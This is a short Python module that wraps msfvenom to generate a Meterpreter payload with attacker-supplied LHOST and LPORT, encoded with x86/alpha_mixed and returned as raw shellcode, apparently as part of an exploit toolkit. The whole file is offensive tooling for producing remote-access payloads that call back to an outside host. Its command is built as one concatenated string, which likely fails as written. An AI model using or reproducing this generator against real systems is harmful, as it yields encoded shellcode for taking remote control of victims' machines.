"""
Generates the Meterpreter payload from msfvenom
"""
import subprocess

def payloadGenerator(msfpath, msfvenom, msfpayload, ip, port, *msfopts):
  opts = ''

  for msfoption in msfopts:
    for k,v in msfoption.items():
      opts += f' {k}={v}'

  return subprocess.Popen(
      msfpath + msfvenom + ' -p ' + msfpayload + ' LHOST=' + ip + ' LPORT=' +
      str(port) + opts +
      ' BufferRegister=EAX EXITFUNC=thread -e x86/alpha_mixed -f raw',
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE,
      stdin=subprocess.PIPE,
  ).communicate()[0]